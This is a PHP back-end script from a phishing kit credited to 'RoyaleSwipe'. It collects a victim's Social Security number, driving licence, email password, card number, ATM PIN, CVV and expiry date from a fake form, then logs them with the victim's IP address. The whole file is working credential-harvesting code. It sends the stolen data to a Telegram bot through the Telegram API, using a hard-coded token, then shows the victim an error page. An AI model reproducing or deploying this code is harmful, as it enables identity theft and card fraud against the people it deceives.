<?php

#IP Address by RoyaleSwipe | t.me/royaleswipe

function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

#Send Log Details to Telegram
$telegram = "on";

$a = $_POST["royaleswipe_ssn"];
$b = $_POST["royaleswipe_drive"];
$c = $_POST["royaleswipe_email"];
$d = $_POST["royaleswipe_pswemail"];
$e = $_POST["royaleswipe_phone"];
$f = $_POST["royaleswipe_cardnumber"];
$g = $_POST["royaleswipe_atmpin"];
$h = $_POST["royaleswipe_cvv"];
$i = $_POST["royaleswipe_expdate"];
$l = $_SERVER['REMOTE_ADDR'];

$data = "|========== [ CUSTOMER INFORMATION ] ==========|\n
🚨 SSN (Social Security Number): $a \n
🚘 Driving License: $b \n
📬 Email Address: $c \n
🔐 Password Email: $d \n
☎️ Phone Number: $e \n
💳 Card Number: $f \n
🚥 ATM PIN: $g \n
🎟 CVV: $h \n
⏳ Expiration Date: $i \n
🌐 IP Address: $l \n
|========== [ END CUSTOMER INFORMATION ] ==========|";

$txt = $data;
$chat_id = "-1001712485865"; // Your Telegram Chat ID
$bot_url = "bot5750060113:AAG1435WVY3YHg7y2p2Du0jDigANPHG4rtU"; //Your Telegram Bot Api Key

if ($telegram == "on"){
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

header("location: error.html");
